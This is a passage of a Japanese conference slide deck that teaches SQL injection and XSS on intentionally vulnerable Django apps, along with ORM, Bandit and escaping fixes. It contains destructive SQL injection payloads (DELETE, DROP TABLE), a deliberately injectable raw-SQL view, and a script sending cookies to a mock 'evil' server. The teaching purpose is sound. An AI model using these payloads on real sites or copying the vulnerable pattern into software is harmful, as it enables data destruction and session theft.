@@ -1,0 +1,822 @@
+
+<!DOCTYPE html>
+
+<html lang="ja">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" /><meta name="generator" content="Docutils 0.19: https://docutils.sourceforge.io/" />
+
+  <title>Djangoアプリに作り込んで学ぶ脆弱性</title>
+    <link rel="stylesheet" type="text/css" href="../_static/revealjs4/dist/reveal.css" />
+    <link rel="stylesheet" href="../_static/revealjs4/dist/theme/black.css" type="text/css" />
+    <link rel="stylesheet" type="text/css" href="../_static/revealjs4/plugin/highlight/zenburn.css" />
+    <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" />
+    <link rel="stylesheet" type="text/css" href="../_static/css/common.css" />
+    <link rel="stylesheet" type="text/css" href="../_static/design-style.1e8bd061cd6da7fc9cf755528e8ffc24.min.css" />
+    <script data-url_root="../" id="documentation_options" src="../_static/documentation_options.js"></script>
+    <script src="../_static/jquery.js"></script>
+    <script src="../_static/underscore.js"></script>
+    <script src="../_static/_sphinx_javascript_frameworks_compat.js"></script>
+    <script src="../_static/doctools.js"></script>
+    <script src="../_static/sphinx_highlight.js"></script>
+    <script src="../_static/translations.js"></script>
+    <script src="../_static/design-tabs.js"></script>
+    <link rel="index" title="索引" href="../genindex.html" />
+    <link rel="search" title="検索" href="../search.html" />
+    
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    
+    
+
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:site" content="@ftnext">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://ftnext.github.io/2023-slides/djangocongressjp/learn-vulnerabilities.html">
+    <meta property="og:title" content="Djangoアプリに作り込んで学ぶ脆弱性">
+    <meta property="og:description" content="2023/10 DjangoCongress JP 2023">
+    <meta property="og:image" content="https://ftnext.github.io/2023-slides/_static/ogps/djangocongressjp.png">
+
+  </head><body>
+    <div class="reveal">
+        <div class="slides">
+            <section >
+<h1>Djangoアプリに作り込んで学ぶ脆弱性</h1>
+<p>SQLインジェクションとXSS篇</p>
+<dl class="field-list simple">
+<dt class="field-odd">Event<span class="colon">:</span></dt>
+<dd class="field-odd"><p>DjangoCongress JP 2023</p>
+</dd>
+<dt class="field-even">Presented<span class="colon">:</span></dt>
+<dd class="field-even"><p>2023/10/07 nikkie</p>
+</dd>
+</dl>
+</section>
+<section>
+<section >
+<h2>⏰一緒に <strong>悪いこと</strong> をする時間です！⏰</h2>
+<ul class="simple">
+<li><p>脆弱性を学ぶために、Djangoでやられサイトを実装してきました</p></li>
+<li><p>脆弱性とはバグ🐛で、 <strong>突いて攻撃できてしまうバグ</strong> です</p></li>
+<li><p>やられサイトへの攻撃を通して、脆弱性の <strong>原因</strong> は何で、どう <strong>対策</strong> するかを学びましょう</p></li>
+</ul>
+</section>
+<section >
+<h3>Djangoで実装したやられサイト</h3>
+<p><a class="reference external" href="https://github.com/ftnext/django-bad-apps">https://github.com/ftnext/django-bad-apps</a></p>
+<ul class="simple">
+<li><p>よければ手元で動かしてみてください</p></li>
+<li><p>GitとDocker（とネットワーク）を前提にしています</p></li>
+</ul>
+</section>
+<section >
+<h3>過去の自分に贈る発表です</h3>
+<ul class="simple">
+<li><p>Djangoのチュートリアルを終えた（+小さいアプリ作ってみた）</p></li>
+<li><p>脆弱性の対策は重要らしいけど、しっかり理解できてないな...（難しそう...）</p></li>
+<li><p>👉やられサイトを攻撃してみたら、脆弱性学ぶの面白い！！</p></li>
+</ul>
+</section>
+<section >
+<h3>お約束：ルールを守って楽しく学ぼう！</h3>
+<ul class="simple">
+<li><p><strong>攻撃は</strong> 手元で動かす <strong>やられサイトだけ</strong> でお願いします</p></li>
+<li><p>世のWebアプリに対して試してはいけません🙅‍♂️（攻撃になっちゃうぞ❤️）</p></li>
+<li><p>本トークの目的は <strong>脆弱性を学ぶ</strong> ことであり、攻撃を勧める内容では決してありません</p></li>
+</ul>
+</section>
+</section>
+<section>
+<section >
+<h2>お前、誰よ（今はやられサイト環境構築の時間）</h2>
+<ul class="simple">
+<li><p>nikkie（にっきー） ／ <span class="fab fa-twitter"></span> <a class="reference external" href="https://twitter.com/ftnext">&#64;ftnext</a></p></li>
+<li><p>株式会社ユーザベースのデータサイエンティスト（<a class="reference external" href="https://hrmos.co/pages/uzabase/jobs/1829077236709650481">We're hiring!</a>）</p></li>
+</ul>
+<img alt="https://drive.google.com/uc?id=19PMMnkqDiFMCJBPwoA1B51ltQBG0y4kL" src="https://drive.google.com/uc?id=19PMMnkqDiFMCJBPwoA1B51ltQBG0y4kL" />
+</section>
+<section >
+<h3>Djangoとnikkie</h3>
+<ul class="simple">
+<li><p>Djangoの実務経験はなし</p></li>
+<li><p><a class="reference external" href="https://tutorial.djangogirls.org/ja/">Django Girls Tutorial</a> の翻訳（2018-2019）</p></li>
+<li><p>PyCon JP スタッフ向けにDjangoでアプリ自作 <a class="reference external" href="https://github.com/pyconjp/pycon.jp.2021.review">https://github.com/pyconjp/pycon.jp.2021.review</a></p></li>
+</ul>
+</section>
+</section>
+<section >
+<h2>Djangoアプリに作り込んで学ぶ脆弱性</h2>
+<ol class="arabic simple">
+<li><p>SQLインジェクション💉</p></li>
+<li><p>XSS篇🙅</p></li>
+</ol>
+</section>
+<section >
+<h2>1️⃣ SQLインジェクション 💉</h2>
+</section>
+<section>
+<section >
+<h2>SQLインジェクションって、なによ</h2>
+<ul class="simple">
+<li><p>Webアプリに文字列を入力できる箇所</p></li>
+<li><p><strong>SQL</strong> を入力したときに、それが <strong>実行</strong> できてしまうバグ（脆弱性）</p></li>
+<li><p>悪意を持ったSQLを実行して攻撃できてしまう☠️</p></li>
+</ul>
+</section>
+<section >
+<h3>これ好き（湯婆婆から身を守れる）</h3>
+<blockquote class="twitter-tweet" data-align="center" data-dnt="true"><p lang="ja" dir="ltr">湯婆婆「フン『千尋&#39; AND Password = &#39;1&#39;; DROP TABLE employee&quot;』というのかい。 」<br>千尋「はい」<br>湯婆婆「贅沢な名だね。今からおまえの名前は、名前は………？」</p>&mdash; ロボ太 (@kaityo256) <a href="https://twitter.com/kaityo256/status/1451737864526389254?ref_src=twsrc%5Etfw">October 23, 2021</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script><p><a class="reference external" href="https://togetter.com/li/1792595">https://togetter.com/li/1792595</a></p>
+</section>
+<section >
+<h3>🏃‍♂️巨人の肩に乗る</h3>
+<p>（🏃‍♂️のスライドは参考情報で、本編では飛ばして進めます）</p>
+<ul class="simple">
+<li><p>DjangoCongress JP 2019 「現場で使える Django のセキュリティ対策」</p></li>
+<li><p>『<a class="reference external" href="https://www.shoeisha.co.jp/book/detail/9784798153957">実践Django</a>』2.6</p></li>
+</ul>
+</section>
+<section >
+<h3>🏃‍♂️「現場で使える Django のセキュリティ対策」</h3>
+<iframe class="speakerdeck-iframe" style="border: 0px; background: rgba(0, 0, 0, 0.1) padding-box; margin: 0px; padding: 0px; border-radius: 6px; box-shadow: rgba(0, 0, 0, 0.2) 0px 5px 40px; width: 100%; height: auto; aspect-ratio: 560 / 315;" frameborder="0" src="https://speakerdeck.com/player/47b9d3a52ec94b27a88367d6ddec316d?slide=45" title="現場で使える Django のセキュリティ対策 / Django security measures for business (DjangoCon JP 2019)" allowfullscreen="true" data-ratio="1.7777777777777777"></iframe></section>
+<section >
+<h3>百聞は一見に如かず、デモの時間です！</h3>
+<p><a class="reference external" href="https://github.com/ftnext/django-bad-apps/tree/main/sql-injection">https://github.com/ftnext/django-bad-apps/tree/main/sql-injection</a></p>
+</section>
+<section >
+<h3><strong class="command">docker compose up</strong></h3>
+<ul class="simple">
+<li><p>SQLインジェクション脆弱性のあるDjangoアプリ <code class="docutils literal notranslate"><span class="pre">web</span></code></p></li>
+<li><p>DB（PostgreSQL） <code class="docutils literal notranslate"><span class="pre">db</span></code></p>
+<ul>
+<li><p><strong class="command">docker compose run web python manage.py loaddata dump_todos.json</strong></p></li>
+</ul>
+</li>
+</ul>
+</section>
+<section >
+<h3>TODOを完全一致で検索</h3>
+<p><a class="reference external" href="http://127.0.0.1:8000/todolist/">http://127.0.0.1:8000/todolist/</a></p>
+<ul class="simple">
+<li><p>「パソコンを買う」で1件に絞れる</p></li>
+<li><p>クエリパラメタ <code class="docutils literal notranslate"><span class="pre">todo=...</span></code></p></li>
+</ul>
+</section>
+</section>
+<section>
+<section >
+<h2>やられサイトをSQLインジェクションで攻撃してみましょう</h2>
+</section>
+<section >
+<h3><strong>複数文</strong> のSQLが実行できるぞ！</h3>
+<ul class="simple">
+<li><p>攻撃「パソコンを買う'; SELECT id FROM todos WHERE '1' = '1」</p></li>
+<li><p>全件表示されます ※ <strong>できちゃダメ</strong> なやつ</p></li>
+</ul>
+<pre data-id="id14"><code data-trim data-noescape class="sql">パソコンを買う';
+SELECT id FROM todos WHERE '1' = '1</code></pre>
+</section>
+<section >
+<h3>全てのTODOをDELETE😈</h3>
+<ul class="simple">
+<li><p>「パソコンを買う'; DELETE FROM todos WHERE '1' = '1'; SELECT id FROM todos WHERE '1' = '1」</p></li>
+</ul>
+<pre data-id="tododelete"><code data-trim data-noescape class="sql">パソコンを買う';
+DELETE FROM todos WHERE '1' = '1';
+SELECT id FROM todos WHERE '1' = '1</code></pre>
+<ul class="simple">
+<li><p>クエリパラメタ指定しても <a class="reference external" href="http://127.0.0.1:8000/todolist/?todo=%E3%83%91%E3%82%BD%E3%82%B3%E3%83%B3%E3%82%92%E8%B2%B7%E3%81%86%27%3B+DELETE+FROM+todos+WHERE+%271%27+%3D+%271%27%3B+SELECT+id+FROM+todos+WHERE+%271%27+%3D+%271">http://127.0.0.1:8000/todolist/?todo=%E3%83%91%E3%82%BD%E3%82%B3%E3%83%B3%E3%82%92%E8%B2%B7%E3%81%86%27%3B+DELETE+FROM+todos+WHERE+%271%27+%3D+%271%27%3B+SELECT+id+FROM+todos+WHERE+%271%27+%3D+%271</a></p></li>
+</ul>
+<aside class="notes">
+復旧は loaddata で</aside>
+</section>
+<section >
+<h3>TODOのテーブルをDROP👹</h3>
+<ul class="simple">
+<li><p>「パソコンを買う'; DROP TABLE todos; SELECT id FROM django_migrations WHERE '1' = '1」</p></li>
+</ul>
+<pre data-id="tododrop"><code data-trim data-noescape class="sql">パソコンを買う';
+DROP TABLE todos;
+SELECT id FROM django_migrations WHERE '1' = '1</code></pre>
+<ul class="simple">
+<li><p>クエリパラメタ指定しても <a class="reference external" href="http://127.0.0.1:8000/todolist/?todo=%E3%83%91%E3%82%BD%E3%82%B3%E3%83%B3%E3%82%92%E8%B2%B7%E3%81%86%27%3B+DROP+TABLE+todos%3B+SELECT+id+FROM+django_migrations+WHERE+%271%27+%3D+%271">http://127.0.0.1:8000/todolist/?todo=%E3%83%91%E3%82%BD%E3%82%B3%E3%83%B3%E3%82%92%E8%B2%B7%E3%81%86%27%3B+DROP+TABLE+todos%3B+SELECT+id+FROM+django_migrations+WHERE+%271%27+%3D+%271</a></p></li>
+</ul>
+</section>
+<section >
+<h3>やられサイトを攻撃できました！</h3>
+<ul class="simple">
+<li><p>DELETE文を実行してデータ削除</p></li>
+<li><p>DROP TABLE文を実行してテーブル削除</p></li>
+</ul>
+</section>
+</section>
+<section>
+<section >
+<h2>実装はどうすればよかったの？</h2>
+<pre data-id="id16"><code data-trim data-noescape class="python" data-line-numbers="4,5">def todo_list(request):
+    todo_str = request.GET[&quot;todo&quot;]
+    sql = (
+        &quot;SELECT id, id_str, todo, created_date, due_date FROM todos &quot;
+        &quot;WHERE todo = '{}';&quot;.format(todo_str)
+    )
+    todos = Todo.objects.raw(sql)</code></pre>
+</section>
+<section >
+<h3>SQLインジェクションできちゃう実装（原因箇所）</h3>
+<ul class="simple">
+<li><p><code class="docutils literal notranslate"><span class="pre">str.format</span></code> で外から渡される文字列をフォーマットしてSQLを組み立てる</p></li>
+<li><p>SQLはORMの <code class="docutils literal notranslate"><span class="pre">raw</span></code> で実行</p></li>
+<li><p><a class="reference external" href="https://docs.djangoproject.com/ja/4.2/ref/models/querysets/#raw">https://docs.djangoproject.com/ja/4.2/ref/models/querysets/#raw</a></p></li>
+</ul>
+</section>
+<section >
+<h3>TODOを検索するだけならいいのですが...</h3>
+<ul class="simple">
+<li><p>「パソコンを買う」が渡されたときはうまくいく</p></li>
+</ul>
+<pre data-id="id18"><code data-trim data-noescape class="sql">SELECT id, id_str, todo, created_date, due_date FROM todos
+WHERE todo = 'パソコンを買う';</code></pre>
+</section>
+<section >
+<h3>複数文作れてしまう☠️</h3>
+<ul class="simple">
+<li><p>「パソコンを買う'; SELECT id FROM todos WHERE '1' = '1」</p></li>
+</ul>
+<pre data-id="id19"><code data-trim data-noescape class="sql">SELECT id, id_str, todo, created_date, due_date FROM todos
+WHERE todo = 'パソコンを買う'; SELECT id FROM todos WHERE '1' = '1';</code></pre>
+<ul class="simple">
+<li><p>外から渡したシングルクォートで <code class="docutils literal notranslate"><span class="pre">'{}'</span></code> の先頭のシングルクォートが閉じてしまい、 <strong>任意のSQLが続けられる</strong></p></li>
+</ul>
+</section>
+<section >
+<h3>対策：ORMを使おう！</h3>
+<pre data-id="orm"><code data-trim data-noescape class="python" data-line-numbers="3">def todo_list(request):
+    todo_str = request.GET[&quot;todo&quot;]
+    todos = Todo.objects.filter(todo=todo_str)</code></pre>
+<ul class="simple">
+<li><p>SQLを原則書かない。 <strong>ORMの書き方を覚えて使う</strong></p></li>
+<li><p><a class="reference external" href="https://docs.djangoproject.com/ja/4.2/ref/models/querysets/#filter">https://docs.djangoproject.com/ja/4.2/ref/models/querysets/#filter</a></p></li>
+</ul>
+</section>
+<section >
+<h3>🏃‍♂️「Make Query Great Again!」</h3>
+<ul class="simple">
+<li><p>DjangoCongress JP 2019より</p></li>
+<li><p><a class="reference external" href="https://www.slideshare.net/dattun/django-congress-jp-2019-make-query-great-again-slide-share">発表スライド</a></p></li>
+<li><p><a class="reference external" href="https://youtu.be/VQvniZoy8HY?si=QAWauZS3W0HKRsPQ">YouTube アーカイブ</a></p></li>
+</ul>
+</section>
+</section>
+<section>
+<section >
+<h2>他の対策：静的解析で気づこう 〜Bandit〜</h2>
+<ul>
+<li><p><a class="reference external" href="https://pypi.org/project/bandit/">https://pypi.org/project/bandit/</a></p>
+<blockquote>
+<div><p>A security linter from PyCQA</p>
+</div></blockquote>
+</li>
+</ul>
+</section>
+<section >
+<h3><strong class="command">bandit views.py</strong></h3>
+<pre data-id="bandit-views-py"><code data-trim data-noescape class="shell">$ bandit bad_sql_injection/todo/views.py  # bandit -r bad_sql_injection
+
+Test results:
+&gt;&gt; Issue: [B608:hardcoded_sql_expressions] Possible SQL injection vector through string-based query construction.
+Severity: Medium   Confidence: Low
+CWE: CWE-89 (https://cwe.mitre.org/data/definitions/89.html)
+More Info: https://bandit.readthedocs.io/en/1.7.5/plugins/b608_hardcoded_sql_expressions.html
+Location: bad_sql_injection/todo/views.py:12:12
+11              sql = (
+12                  &quot;SELECT id, id_str, todo, created_date, due_date FROM todos &quot;
+13                  &quot;WHERE todo = '{}';&quot;.format(todo_str)
+14              )</code></pre>
+</section>
+<section >
+<h3>🏃‍♂️「静的コード解析から見出す一人前Pythonistaへの道」</h3>
+<ul class="simple">
+<li><p>Banditを知ったきっかけ（紹介された静的解析ツールの1つ）</p></li>
+<li><p>PyCon Kyushu 2022</p></li>
+<li><p><a class="reference external" href="https://www.docswell.com/s/moonwalkerpoday/ZP4VE5-2022-01-22-133417">発表スライド</a></p></li>
+</ul>
+</section>
+</section>
+<section>
+<section >
+<h2>SQLインジェクションのまとめ🌯</h2>
+<ul class="simple">
+<li><p><strong>悪意を持ったSQLを注入</strong> できてしまう脆弱性</p></li>
+<li><p>任意のSQLを実行して、やりたい放題攻撃した</p></li>
+</ul>
+</section>
+<section >
+<h3>SQLインジェクション脆弱性を埋め込む実装🙅‍♂️</h3>
+<ul class="simple">
+<li><p>外から渡される文字列を <strong>str.formatしてSQLを組み立て</strong>、ORMの <code class="docutils literal notranslate"><span class="pre">raw</span></code> で実行</p></li>
+</ul>
+<pre data-id="id21"><code data-trim data-noescape class="python">sql = (
+    &quot;SELECT id, id_str, todo, created_date, due_date FROM todos &quot;
+    &quot;WHERE todo = '{}';&quot;.format(todo_str)
+)</code></pre>
+<ul class="simple">
+<li><p><strong>シングルクォートのあとに任意のSQL</strong> を入力して、実行してしまえる</p></li>
+</ul>
+</section>
+<section >
+<h3>SQLインジェクション脆弱性を埋め込まない実装</h3>
+<ul class="simple">
+<li><p>Djangoの <strong>ORM</strong> を使う（今回であれば <code class="docutils literal notranslate"><span class="pre">filter</span></code>）</p></li>
+<li><p>Banditで気付ける</p></li>
+</ul>
+</section>
+<section >
+<h3>⚠️この場限りにしてくださいね（攻撃になっちゃうので！）</h3>
+<ul class="simple">
+<li><p>あなたが利用しているWebアプリのフォームに、ここで紹介した入力はしないでください</p></li>
+<li><p>それは <strong>攻撃</strong> です（学習用のこのアプリだけにしてください）</p></li>
+</ul>
+</section>
+<section >
+<h3>ありがとう、Djangoチュートリアル</h3>
+<ul class="simple">
+<li><p>SQLインジェクションがどういうものか分かっていなかった あの日の私、チュートリアルに沿うことで回避していた</p></li>
+<li><p><a class="reference external" href="https://tutorial.djangogirls.org/ja/django_orm/">DjangoのORMとクエリセット</a></p></li>
+</ul>
+</section>
+<section >
+<h3>🏃‍♂️関連アウトプット</h3>
+<ul class="simple">
+<li><p><a class="reference external" href="https://nikkie-ftnext.hatenablog.com/entry/bad-todo-list-sql-injection-first-time">これがSQLインジェクション！ やられサイトBad Todo Listで体験し、湯婆婆に対する防衛術を習得しました！</a></p></li>
+<li><p><a class="reference external" href="https://nikkie-ftnext.hatenablog.com/entry/django-bad-example-sql-injection-manager-raw">SQLインジェクションされちゃうDjangoアプリってどう作る？ ORMの代わりにrawメソッドを使って実装し攻撃してみる（よいハッカーは真似しないでね）</a></p></li>
+</ul>
+</section>
+<section >
+<h3>🏃‍♂️SQLインジェクションの診断の様子</h3>
+<iframe width="560" height="315" src="https://www.youtube-nocookie.com/embed/aXNhsQbeJec?si=PL5fAyCN4WFqfhIB" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe></section>
+</section>
+<section>
+<section >
+<h2>小話：復旧に使ったmanage.pyのコマンド</h2>
+<p>時間調整パート。SQLインジェクションの開発中に学んだtipsご紹介</p>
+</section>
+<section >
+<h3><strong class="command">python manage.py loaddata</strong></h3>
+<ul class="simple">
+<li><p>JSONファイルを指定して、テーブルにデータを入れられる</p></li>
+<li><p><a class="reference external" href="https://docs.djangoproject.com/ja/4.2/ref/django-admin/#loaddata">https://docs.djangoproject.com/ja/4.2/ref/django-admin/#loaddata</a></p></li>
+<li><p>JSONファイルは <a class="reference external" href="https://docs.djangoproject.com/ja/4.2/ref/django-admin/#dumpdata">dumpdata</a> で作っておく</p></li>
+</ul>
+</section>
+<section >
+<h3>DROPした後の復旧</h3>
+<pre data-id="drop"><code data-trim data-noescape class="shell">$ python manage.py sqlmigrate todo 0001  # SQLを出力
+$ psql -h 127.0.0.1 -p 5432 -U developer badapp
+# SQLを実行していく</code></pre>
+</section>
+<section >
+<h3><strong class="command">python manage.py sqlmigrate</strong></h3>
+<ul class="simple">
+<li><p>アプリとマイグレーション番号を指定して、 <strong>SQLを確認できる</strong></p></li>
+<li><p><a class="reference external" href="https://docs.djangoproject.com/ja/4.2/ref/django-admin/#sqlmigrate">https://docs.djangoproject.com/ja/4.2/ref/django-admin/#sqlmigrate</a></p></li>
+</ul>
+<pre data-id="python-manage-py-sqlmigrate"><code data-trim data-noescape class="shell">python manage.py sqlmigrate todo 0001</code></pre>
+</section>
+<section >
+<h3>他に <strong class="command">python manage.py dbshell</strong> も</h3>
+<ul class="simple">
+<li><p>（仮想環境で開発する中で）DROPしたテーブルを復旧するのに使用</p></li>
+<li><p><strong class="command">sqlmigrate</strong> で確認したSQLを流す</p></li>
+<li><p><a class="reference external" href="https://docs.djangoproject.com/ja/4.2/ref/django-admin/#dbshell">https://docs.djangoproject.com/ja/4.2/ref/django-admin/#dbshell</a></p></li>
+</ul>
+</section>
+<section >
+<h3>🏃‍♂️「Django 管理コマンド manage.py を深掘り」</h3>
+<ul class="simple">
+<li><p>DjangoCongress JP 2022より</p></li>
+<li><p><a class="reference external" href="https://docs.google.com/presentation/d/1pco7ey3I1Eqa_f2MM8a5ziwAKnZHCm92GGweEBQYJ8c/edit#slide=id.g184278461a4_1_151">発表スライド</a></p></li>
+<li><p><a class="reference external" href="https://youtu.be/QSJDrcQB0z8?si=llOvPPv3dTHRovrF">YouTube アーカイブ</a></p></li>
+</ul>
+</section>
+</section>
+<section >
+<h2>2️⃣ XSS（クロスサイト・スクリプティング） 🙅</h2>
+<p>Cross-Site Scripting</p>
+</section>
+<section>
+<section >
+<h2>XSSって、なによ</h2>
+<ul class="simple">
+<li><p>Webアプリに文字列を入力できる箇所</p></li>
+<li><p><strong>HTMLやJavaScriptコード</strong> を入力したときに、それが <strong>実行</strong> できてしまうバグ（脆弱性）</p></li>
+<li><p>悪意を持ったJavaScriptを実行して攻撃できてしまう☠️</p></li>
+</ul>
+</section>
+<section >
+<h3>🏃‍♂️巨人の肩に乗る</h3>
+<ul class="simple">
+<li><p>DjangoCongress JP 2019 「現場で使える Django のセキュリティ対策」</p></li>
+<li><p>『<a class="reference external" href="https://www.shoeisha.co.jp/book/detail/9784798153957">実践Django</a>』4.4</p></li>
+</ul>
+</section>
+<section >
+<h3>🏃‍♂️「現場で使える Django のセキュリティ対策」</h3>
+<iframe class="speakerdeck-iframe" style="border: 0px; background: rgba(0, 0, 0, 0.1) padding-box; margin: 0px; padding: 0px; border-radius: 6px; box-shadow: rgba(0, 0, 0, 0.2) 0px 5px 40px; width: 100%; height: auto; aspect-ratio: 560 / 315;" frameborder="0" src="https://speakerdeck.com/player/47b9d3a52ec94b27a88367d6ddec316d?slide=60" title="現場で使える Django のセキュリティ対策 / Django security measures for business (DjangoCon JP 2019)" allowfullscreen="true" data-ratio="1.7777777777777777"></iframe></section>
+<section >
+<h3>百聞は一見に如かず、デモの時間です！</h3>
+<p><a class="reference external" href="https://github.com/ftnext/django-bad-apps/tree/main/cross-site-scripting">https://github.com/ftnext/django-bad-apps/tree/main/cross-site-scripting</a></p>
+</section>
+<section >
+<h3><strong class="command">docker compose up</strong></h3>
+<ul class="simple">
+<li><p>XSS脆弱性のあるDjangoアプリ <code class="docutils literal notranslate"><span class="pre">web</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">db</span></code> （PostgreSQL）</p></li>
+<li><p>攻撃者が用意したサーバ（WireMock） <code class="docutils literal notranslate"><span class="pre">evil-server</span></code></p></li>
+</ul>
+</section>
+<section >
+<h3>最初はJavaScriptの実行の例から</h3>
+<p><a class="reference external" href="http://127.0.0.1:8000/example/">http://127.0.0.1:8000/example/</a></p>
+<ul class="simple">
+<li><p>JavaScriptコードが実行されるページ</p></li>
+<li><p>悪意を持ったJavaScriptコードが実行されるページ</p></li>
+</ul>
+</section>
+</section>
+<section>
+<section >
+<h2>JavaScriptが実行される例</h2>
+<p><a class="reference external" href="http://127.0.0.1:8000/example/alert/">http://127.0.0.1:8000/example/alert/</a></p>
+<ul class="simple">
+<li><p>「XSSです」がポップアップしました</p></li>
+</ul>
+<pre data-id="id32"><code data-trim data-noescape class="python">def alert(request):
+    return HttpResponse('&lt;script&gt;alert(&quot;XSSです&quot;)&lt;/script&gt;')</code></pre>
+</section>
+<section >
+<h3><code class="docutils literal notranslate"><span class="pre">HttpResponse</span></code> でscriptタグを返している</h3>
+<ul class="simple">
+<li><p>レスポンス（HTML）中にscriptタグ！</p></li>
+</ul>
+<pre data-id="httpresponse-script"><code data-trim data-noescape class="html">&lt;script&gt;alert(&quot;XSSです&quot;)&lt;/script&gt;</code></pre>
+<ul class="simple">
+<li><p><strong>ブラウザはこれを実行</strong> （scriptタグなので）</p></li>
+</ul>
+</section>
+</section>
+<section>
+<section >
+<h2>悪意を持ったJavaScriptコードの例</h2>
+<ul class="simple">
+<li><p><strong>cookieを他サイトに送信</strong> するJavaScriptコード</p></li>
+<li><p>Webアプリにログインしているとき、cookieを使ってセッション管理をしている</p></li>
+</ul>
+</section>
+<section >
+<h3>HTTP Cookie</h3>
+<p><a class="reference external" href="https://developer.mozilla.org/ja/docs/Web/HTTP/Cookies">https://developer.mozilla.org/ja/docs/Web/HTTP/Cookies</a></p>
+<ul class="simple">
+<li><p>「<em>サーバーがユーザーのウェブブラウザーに送信する小さなデータ</em>」</p></li>
+<li><p>「<em>ブラウザーに保存され、その後のリクエストと共に同じサーバーへ返送</em>」</p></li>
+</ul>
+</section>
+<section >
+<h3>cookieを他サイトへ送信😈</h3>
+<pre data-id="cookie"><code data-trim data-noescape class="javascript">window.location = &quot;http://0.0.0.0:8080/evil?cookie=&quot;+escape(document.cookie)</code></pre>
+<ul class="simple">
+<li><p>このスクリプトを実行したブラウザのcookieを、クエリパラメタに加える</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">window.location</span></code> への代入でブラウザを遷移させて、攻撃者が用意したサーバに送信</p></li>
+</ul>
+</section>
+<section >
+<h3>攻撃されてみましょう</h3>
+<p><a class="reference external" href="http://127.0.0.1:8000/example/send/">http://127.0.0.1:8000/example/send/</a></p>
+<ul class="simple">
+<li><p>Your cookie is ... と表示される</p></li>
+<li><p>これは攻撃者が用意したサーバ（モックサーバ）のレスポンス</p></li>
+</ul>
+</section>
+<section >
+<h3>どのように攻撃されたのか 1/2</h3>
+<ul class="simple">
+<li><p>ブラウザは <a class="reference external" href="http://127.0.0.1:8000/example/send/">http://127.0.0.1:8000/example/send/</a> を開いた（Djangoアプリにリクエスト）</p></li>
+<li><p>Djangoアプリは、 <strong>cookieを送信するscriptタグを含むレスポンス</strong> を返した</p></li>
+</ul>
+<pre data-id="id35"><code data-trim data-noescape class="html">&lt;script&gt;window.location = &quot;http://0.0.0.0:8080/evil?cookie=&quot;+escape(document.cookie)&lt;/script&gt;</code></pre>
+</section>
+<section >
+<h3>どのように攻撃されたのか 2/2</h3>
+<ul class="simple">
+<li><p>ブラウザはレスポンスをレンダリングする中で <strong>scriptタグを実行</strong> （してしまう）</p></li>
+<li><p>scriptタグは <strong>モックサーバにcookieを含めたリクエストを送信</strong> した（＝攻撃者がcookieを知った）</p></li>
+<li><p>ブラウザに表示されたのは、モックサーバのレスポンス</p></li>
+</ul>
+</section>
+<section >
+<h3>🏃‍♂️ 0.0.0.0って、なによ</h3>
+<ul class="simple">
+<li><p>すべてのネットワークインターフェース</p></li>
+<li><p>ref: <a class="reference external" href="https://jisou-programmer.beproud.jp/%E3%83%8D%E3%83%83%E3%83%88%E3%83%AF%E3%83%BC%E3%82%AF/105-127.0.0.1%E3%81%A80.0.0.0%E3%81%AE%E9%81%95%E3%81%84.html">105:127.0.0.1と0.0.0.0の違い</a> 『自走プログラマー』</p></li>
+</ul>
+</section>
+</section>
+<section>
+<section >
+<h2>どうすればよかったの？ー <strong>エスケープ</strong></h2>
+<ul class="simple">
+<li><p><code class="docutils literal notranslate"><span class="pre">HttpResponse</span></code> にHTMLやJavaScriptコードが渡る可能性がある場合、 <strong>エスケープ</strong> して渡しましょう！</p></li>
+</ul>
+<pre data-id="id38"><code data-trim data-noescape class="python">from django.utils.html import escape</code></pre>
+</section>
+<section >
+<h3><code class="docutils literal notranslate"><span class="pre">django.utils.html.escape</span></code></h3>
+<p><a class="reference external" href="https://github.com/django/django/blob/4.2.6/django/utils/html.py#L17-L27">https://github.com/django/django/blob/4.2.6/django/utils/html.py#L17-L27</a></p>
+<blockquote>
+<div><p>Return the given text with ampersands, quotes and angle brackets encoded for use in HTML.</p>
+</div></blockquote>
+<ul class="simple">
+<li><p><code class="docutils literal notranslate"><span class="pre">&amp;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">'</span></code> <code class="docutils literal notranslate"><span class="pre">&quot;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;</span></code> <code class="docutils literal notranslate"><span class="pre">&gt;</span></code></p></li>
+</ul>
+</section>
+<section >
+<h3><code class="docutils literal notranslate"><span class="pre">django.utils.html.escape</span></code> の実装</h3>
+<pre data-id="id39"><code data-trim data-noescape class="python">&#64;keep_lazy(SafeString)
+def escape(text):
+    return SafeString(html.escape(str(text)))</code></pre>
+</section>
+<section >
+<h3>エスケープで対策できてます！</h3>
+<pre data-id="id40"><code data-trim data-noescape class="python">def alert(request):
+    return HttpResponse(escape('&lt;script&gt;alert(&quot;XSSです&quot;)&lt;/script&gt;'))</code></pre>
+<pre data-id="id40"><code data-trim data-noescape class="html">&amp;lt;script&amp;gt;alert(&amp;quot;XSSです&amp;quot;)&amp;lt;/script&amp;gt;</code></pre>
+<ul class="simple">
+<li><p><strong>ブラウザにとってはscriptタグでない</strong> ので、JavaScriptの実行はされません！</p></li>
+</ul>
+</section>
+<section >
+<h3>Djangoテンプレートでも対策できます！</h3>
+<ul>
+<li><p><code class="docutils literal notranslate"><span class="pre">{{</span> <span class="pre">variable</span> <span class="pre">}}</span></code> による <strong>変数展開でエスケープ</strong> される</p></li>
+<li><p>Djangoドキュメント中の <a class="reference external" href="https://docs.djangoproject.com/ja/4.2/topics/security/#cross-site-scripting-xss-protection">クロス・サイト・スクリプティング (XSS) の防御</a> より</p>
+<blockquote>
+<div><p>Django のテンプレートを用いる事で多数の XSS 攻撃に対抗することができます。</p>
